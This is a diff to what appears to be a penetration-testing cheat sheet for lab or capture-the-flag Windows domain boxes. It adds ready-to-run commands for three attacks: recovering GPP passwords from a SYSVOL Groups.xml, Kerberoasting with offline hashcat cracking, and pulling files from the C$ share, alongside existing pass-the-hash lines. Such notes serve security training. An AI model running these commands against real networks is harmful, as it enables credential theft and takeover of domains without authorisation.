@@ -99,6 +99,10 @@ curl -X POST --data-urlencode "username=$Username&password=$Password" http://$Bo
 # SMB anonymous and authenticated checks
 smbclient -N -L //$BoxIP
 smbclient //$BoxIP/$Share -U "$Username%$Password"
+# Download an anonymously readable AD Replication policy tree for offline GPP review
+smbclient //$BoxIP/Replication -N -c 'recurse ON; prompt OFF; mget *'
+# Recover a GPP-managed password from a downloaded Groups.xml without placing it in the command text
+gpp-decrypt "$(awk -F'cpassword=\"' '{print $2}' $BoxDir/loot/Replication/Policies/*/MACHINE/Preferences/Groups/Groups.xml | awk -F'\"' '{print $1}')"
 
 # SSH and FTP authentication
 ssh $Username@$BoxIP
@@ -511,15 +515,20 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 ```bash
 # LDAP and domain discovery
 ldapsearch -x -H ldap://$BoxIP -b "dc=$Domain"
+ldapsearch -x -H ldap://$BoxIP -s base namingcontexts
 kerbrute userenum -d $Domain --dc $BoxIP $Userlist
 impacket-GetNPUsers $Domain/ -usersfile $Userlist -format john
 impacket-GetUserSPNs $Domain/$Username:$Password -request
+# Kerberoast and crack a captured TGS-REP ticket offline
+GetUserSPNs.py $Domain/$Username:$Password -dc-ip $DCip -request -outputfile $BoxDir/loot/kerberoast.txt
+hashcat -m 13100 $BoxDir/loot/kerberoast.txt /usr/share/wordlists/rockyou.txt --potfile-path $BoxDir/loot/hashcat.potfile
 
 # BloodHound collection
 bloodhound-python -d $Domain -u $Username -p $Password -ns $BoxIP -c all
 
 # SMB checks and pass the hash
 netexec smb $BoxIP -u $Username -p $Password --shares
+smbclient //$BoxIP/C$ -U "$Username2%$Password2" -c "get Users/Administrator/Desktop/root.txt $BoxDir/loot/root.txt"
 impacket-psexec -hashes $LMHash:$NTHash $Username@$BoxIP
 evil-winrm -i $BoxIP -u $Username -p $Password
 ```
